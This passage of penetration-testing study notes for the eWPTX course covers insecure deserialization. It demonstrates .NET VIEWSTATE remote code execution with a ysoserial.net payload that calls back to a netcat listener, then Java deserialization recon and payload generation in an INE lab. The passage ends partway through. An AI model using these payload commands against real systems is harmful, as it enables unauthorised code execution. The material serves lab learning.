id="09ca2b4a-95e7-4ddc-a489-acd500db507c" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;page ViewStateEncryptionMode=&quot;Always&quot;/&gt;
</code></pre><blockquote id="2f3d0c49-aa65-491d-9be5-2d33c0e7cfa7" class="">this can be done via the IIS management console too</blockquote><p id="6a564265-fe4c-4c10-b00a-4eb768a2dcd0" class="">In order to enable the Windows server IIS, go to:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="9b1073f4-39ec-4b23-b7a7-621996bdb7ef" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Control Panel &gt; Programs &gt; Turn windows features on or off
Select Internet Information Services (IIS)

# The files served by the IIS will be present in the standard directory:
c:\inetpub\wwwroot
</code></pre><ul id="a5c464ff-95d7-4b66-89a5-c5ebfa731e97" class="bulleted-list"><li style="list-style-type:disc">If u set up the server correctly - restart the pc and go to http://127.0.0.1</li></ul><ul id="35e534b0-aba4-4f78-8cb8-46f59533d728" class="bulleted-list"><li style="list-style-type:disc">open burp to observe the HTTP traffic</li></ul><p id="51ddf4c0-787e-486e-9358-d5041abc5be0" class="">In the wwwroot directory, we will create 3 files:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="3e21ca7f-6b61-4fa2-b433-8f6b335edb3e" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- hello.aspx (the frontend logic)
- hello.aspx.cs (backend)
- web.config (the IIS standard config file)
</code></pre><figure id="4edafaec-f047-46f3-b311-a89a168dae38" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/29.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/29.png"/></a></figure><figure id="59641a56-8fda-48c3-80f3-d6a8b020eb2e" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/30.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/30.png"/></a></figure><figure id="620bd46e-a9e1-4bb6-86b7-ecd943884695" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/31.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/31.png"/></a></figure><p id="707b7cee-e147-46bb-a5d4-dbc2c5ff39f2" class="">The result is a text area, when u click the button the text that u wrote is displayed</p><ul id="ba9bfe5f-0c78-44fb-aae0-51b5dc934ade" class="bulleted-list"><li style="list-style-type:disc">The web.config file instructs the web server not to require MAC validation of the __VIEWSTATE parameter</li></ul><ul id="cb1e68f2-715a-4d33-82b7-8dd749bdaaec" class="bulleted-list"><li style="list-style-type:disc">This allow us to tamper with the parameter and the server will try to deserialize it anyway</li></ul><h3 id="ad63e23a-ccae-4be7-99d6-1cd34affa151" class=""><strong>Test BURP</strong><strong><a href="https://johnermac.github.io/notes/ewptx/zattackingserialization/#test-burp"></a></strong></h3><p id="2eae1970-b93d-4bd5-90e3-a657178edbe4" class="">Go to the page, click in the button with some text and capture that on BURP</p><ul id="287e2e20-4b34-436e-9ae5-386def72e840" class="bulleted-list"><li style="list-style-type:disc">Send the request to <strong>Repeater</strong> and navigate to <strong>ViewState</strong> tab in Burp</li></ul><ul id="3bc6769f-6ff7-4591-85db-cc208eefe580" class="bulleted-list"><li style="list-style-type:disc">Burp displays information that MAC is not enabled!</li></ul><p id="09a31bf2-5888-4b97-b0e4-741f98e47503" class="">Lets generate a payload using <strong>ysoserial.net</strong> and put it into the viewstate parameter. The payload will perform a simple HTTP request, since this is the appropriate approach before trying more specific RCE payloads</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="bf8010d1-2b4c-4a80-b13e-30d1fc9baca0" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c &quot;powershell.exe Invoke-WebRequest -Uri http://127.0.0.1:9000/abcdabcdabcd&quot;
</code></pre><p id="39fbc671-ac50-462f-b94e-ddba42af1abc" class="">We can see that the netcat listener received a request from Windows Powershell:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="4c06e491-e5c2-4c9d-b917-cb39d0657afd" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">nc -lvnp 9000
</code></pre><p id="5979c7c2-0eff-4acd-a803-71b0560417b6" class="">The server response contains the 500 error code; Howeverm powershell is executed. Using the Process Hacker tool we can confirm that indeed IIS spawned the powershell process</p><blockquote id="c2899c73-66df-4de2-8162-5319b908ded2" class="">We have achieved RCE via .NET VIEWSTATE deserialization</blockquote><h3 id="c02cd958-071c-4438-a752-d99a54a08afb" class=""><strong>2nd test - The .cs file was modified</strong><strong><a href="https://johnermac.github.io/notes/ewptx/zattackingserialization/#2nd-test---the-cs-file-was-modified"></a></strong></h3><figure id="15cfd54c-6715-4283-b8ec-271e25c75981" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/32.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/32.png"/></a></figure><p id="44e9244f-f3d1-41d3-86e1-758cb523f196" class="">we can now see in BURP that VIEWSTATE parameter is no longer present in the website requests</p><ul id="0ea8c39f-5cd6-450d-b1b6-132f25085fff" class="bulleted-list"><li style="list-style-type:disc">But if we add the viewstate parameter anyway, the code execution still works</li></ul><figure id="a3980eba-416b-4734-bb1c-149047112bb9" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/33.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/33.png"/></a></figure><p id="ede35f5f-4da5-486f-8f5e-cd41a6563c78" class="">The later is the .NET framework version, the more difficult its to tamper with the viewstate</p><ul id="310d2a0a-53bb-4603-befe-0c75a9ba9b0a" class="bulleted-list"><li style="list-style-type:disc">If MAC validation is enabled, then it could be possible to exploit viewstate-based deserialization only if the MAC key is hardcoded (e.g. web.config)</li></ul><ul id="fcd9f62c-00b0-4072-aa4c-c36e9b3b8a88" class="bulleted-list"><li style="list-style-type:disc">The current default setting of IIS are to generate the key at runtime, and its different For each app</li></ul><p id="94977101-add2-4ed8-9861-ed739b88347d" class="">Moreover:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="bc256de0-b5f3-4b00-9638-8384e0408833" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817
- https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/
</code></pre><p id="a6794511-9f3c-4832-919b-a293229a1049" class="">2nd exercise - Modify the hello.aspx.cs</p><h2 id="3a565f0d-f1ee-4c7b-b4c5-b80d6bb81bd9" class=""><strong>Other Serialization</strong><strong><a href="https://johnermac.github.io/notes/ewptx/zattackingserialization/#other-serialization"></a></strong></h2><p id="cbfc5248-1d5d-43ad-bf79-157527f44cd7" class="">Each dev language has its own deserialization logic and entry points/transportation mechanims of serialized data.</p><ul id="d33b249c-b17c-4b12-b10a-9cef3714eaad" class="bulleted-list"><li style="list-style-type:disc">Less popular languages will result in harder exploitation of deserialization vulns, since no automated tools, like ysoserial will exist</li></ul><ul id="b3bdfc5d-3ec8-4ea2-a3f9-ebd9a77f0383" class="bulleted-list"><li style="list-style-type:disc">Deserialization of untrusted data does not necessarily lead to code execution</li></ul><blockquote id="25df1385-02cd-490b-ae66-0ba28de59b2f" class="">You might often be able to view the full code of a target application on github repository</blockquote><p id="f24c1532-638e-4af5-a17a-44200ce482cb" class="">WHen looking FOr this vuln, pay attention to:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="4a02cd1f-4814-49a8-b20c-f6c4f049a8a5" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- Contains strings that are similar to method names or object names
- Contains Binary data
- Is in a complex, structured form
</code></pre><h3 id="f49521a8-0b2c-4e82-be7c-5c6f88475d0c" class=""><strong>Python-based serialization</strong><strong><a href="https://johnermac.github.io/notes/ewptx/zattackingserialization/#python-based-serialization"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="cbb3c37d-7763-4b8b-90c8-17f4751b9644" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- https://intoli.com/blog/dangerous-pickles/
- https://lincolnloop.com/blog/playing-pickle-security/
</code></pre><h3 id="870cadf9-6e32-4a6a-8763-604c69251c7d" class=""><strong>Ruby Insecure Deserialization</strong><strong><a href="https://johnermac.github.io/notes/ewptx/zattackingserialization/#ruby-insecure-deserialization"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f35c220e-e9c2-480c-b3d2-a6eef17ab433" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- https://blog.rubygems.org/2017/10/09/unsafe-object-deserialization-vulnerability.html
</code></pre><h3 id="9ef5bc8c-7b51-4db3-b32c-f2635d41d582" class=""><strong>Generic presentation about all mentioned technologies</strong><strong><a href="https://johnermac.github.io/notes/ewptx/zattackingserialization/#generic-presentation-about-all-mentioned-technologies"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e446488f-aea8-4962-92d3-2562a8a19e1d" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- https://insomniasec.com/downloads/publications/Deserialization%20-%20%20What%20Could%20Go%20Wrong.pdf
</code></pre><h3 id="479f8b9c-8269-4d6a-997b-5eb44c55cef3" class=""><strong>Examples in Snake YAML</strong><strong><a href="https://johnermac.github.io/notes/ewptx/zattackingserialization/#examples-in-snake-yaml"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="aba4cb83-21fe-4472-8cfe-93c36b2655f3" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- https://medium.com/@swapneildash/snakeyaml-deserilization-exploited-b4a2c5ac0858
- https://blog.semmle.com/swagger-yaml-parser-vulnerability/
</code></pre><h2 id="3e37bcfa-9f18-45ea-a01e-626fc7075e90" class=""><strong>Lab 1</strong><strong><a href="https://johnermac.github.io/notes/ewptx/zattackingserialization/#lab-1"></a></strong></h2><h3 id="56b1a98d-bf10-4610-9a7c-8b586ad17534" class=""><strong>Task 1. Perform reconnaissance and identify a vulnerable web application</strong><strong><a href="https://johnermac.github.io/notes/ewptx/zattackingserialization/#task-1-perform-reconnaissance-and-identify-a-vulnerable-web-application"></a></strong></h3><p id="902b81b7-ad7c-4b6a-a931-712e36e2554e" class="">Step 1: Start the lab. Wait until the lab is ready. Once the lab is ready, the kali Linux interface will be available on the browser.</p><p id="a281e9c4-b4e4-4e68-8617-3497bf062d64" class="">Step 2: Scan the network with Nmap and gather the information about the target machine.</p><p id="9a43d58e-3b5a-4450-a8a9-ab1d6fd3e26c" class="">Use the following command to get the information about open ports and services in the network.</p><p id="dddff6c3-84f6-497b-ba29-39a427c80f95" class="">Command:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a4aef024-d253-4e04-afc7-5f511007a3da" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">
nmap demo.ine.local
</code></pre><p id="23825d6e-0304-4575-90b0-c374d2119316" class="">Got the information about the IP address and the ports which are open in the target machine.</p><p id="94bfca55-9d00-4198-a035-0d67158adaeb" class="">Step 3: Use Dirb to list the directories of the website hosted on the server.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a6c3667b-2cb7-4269-ac40-7401b6a9d919" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">DIRB is a command-line-based tool to brute force any directory based on wordlists.

Command:

dirb http://demo.ine.local/ /usr/share/dirb/wordlists/common.txt
</code></pre><p id="15da991d-ae2d-4350-9c61-0b389a18c87a" class="">Task 2. Identify exploitable conditions</p><p id="36e5b0b2-1e43-491b-b40b-27195ac12637" class="">Step 1: Navigate to the target URL.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="81ff7f76-bed9-4c7a-8e5d-2b083f317346" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Target URL:
http://demo.ine.local/upload/
</code></pre><p id="8c0dfcee-bb83-40be-b802-c8253d3a4f8e" class="">Step 2: Upon entering the page and provide an “index.php?sent=OK” parameter in the end of the URL.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="3b24124f-5587-43e3-852f-d10949e26d74" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">The application tries to read a file named &quot;data.ser&quot; but throws a Java-related exception.
</code></pre><p id="b624de6b-d721-4851-904c-30730d1eb86e" class="">Step 3: Create a sample file with the following command.</p><p id="b42d3cfd-82ab-40e9-9589-f432a04e95de" class="">Command:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="383bad45-d900-42be-9bb1-227defe4e0b7" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">echo &quot;sample text&quot; &gt; example.txt
</code></pre><p id="1b73c417-15fc-4e21-b264-7a33f9e62a79" class="">Step 4: Navigate to the upload page. The upload page allows uploading a file to an unknown location.</p><blockquote id="1fab84ad-de4f-4234-8d42-fe7c02fed03b" class="">[Note] There is a brief delay before the file is uploaded, which can mean that it is being processed by a kind of back-end logic. Open two tabs on one page with sent=ok at the end and the upload page.</blockquote><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="31b35144-7286-4b04-8173-08afd87c264e" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Select the example.txt and click upload then quickly switch the tabs.
</code></pre><p id="ceb87e2d-e875-4413-828a-8ecf1c3c3a77" class="">Step 5: Upload the file using the upload page and try to read the file.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="90bcaf4e-8355-451c-8243-e347e299f113" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- The application moves away from any uploaded files once they are processed. To be able to read them on time, one should click the &quot;Read the file&quot; button before the upload message is displayed.

- Now if the &quot;OK&quot; button at &quot;Read the file&quot; is clicked quickly enough (it is best to have it in a separate tab) then the error message changes indicating, that possibly, the file content was deserialized unsuccessfully due to a corrupted format.

- It looks like we have identified an untrusted data deserialization vulnerability, which can only be exploited when the payload file is timely delivered to the application.
</code></pre><p id="e877a804-3b01-4964-92c7-c60b86b6e3f6" class="">Task 3. Achieve code execution</p><p id="617a4abd-239e-45e0-b100-633b91630620" class="">To create an exploit, we will need three things:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e2a31a28-9ac2-454d-9e77-90afe0f58e51" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">1. Ysoserial payloads to try, as we do not know which exactly will work
2. A loop that will constantly try to upload and then read the file
3. A check to identify whether code execution was achieved or not
</code></pre><p id="6fea64c9-af2e-41df-9dbf-c5baea9df55c" class="">Step 1: As we have so many payloads in ysoserial tools, we will create a loop with different payloads that will constantly try to upload and then read the file.</p><p id="c11f39b3-cb74-4dd8-bb5d-5a607dcad288" class="">To get list of ysoserial payloads, one of the ways can be to copy ysoserial’s output to a file, our is called yso.</p><p id="5dad36fc-7167-481e-b07a-166835d0e473" class="">Command:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="69167310-d9fc-40b8-b9a6-ba0a39a9b696" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">java -jar ~/Desktop/tools/ysoserial/ysoserial-master-SNAPSHOT.jar &gt;yso  2&gt;&amp;1
cat yso | tr -d &#x27; &#x27; | cut -d &quot;@&quot; -f 1 &gt; payloads.txt
sed -i -e &#x27;1,7d&#x27;  payloads.txt
</code></pre><p id="555fb681-8c01-4043-90ed-80dba7d70c48" class="">This commands will save the payload in the yso file and format it to make a payloads list of ysoserial tool and finally save it as payloads.txt.</p><p id="aa3b2374-15a9-4c27-8bde-de72006b123a" class="">Command:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="28373bbb-1d19-462f-b224-cf76bfa48858" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">cat payloads.txt
</code></pre><p id="827a18cd-8fdd-4362-a70e-f0848194d13b" class="">The result will look similar to this.</p><p id="a9a34473-ce23-4c26-b481-ad98de320c9e" class="">Step 2: Generate a payload for each line of the aforementioned list.</p><blockquote id="ccc86100-5a6f-4262-8c62-254bbae2c4ec" class="">[Note] We are going to ping the IP of the attacker machine not the target machine.</blockquote><p id="b13c600a-afeb-406f-8338-10c474591d2d" class="">Change the directory to home so that we can list all the payloads easily here.</p><p id="cb1b6466-6dae-4dd1-bdf8-a15d2768c865" class="">Command:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d3ad04ba-e7ef-4f9a-ab56-ce59feba7d99" class="code"><code class="language-Plain Text" 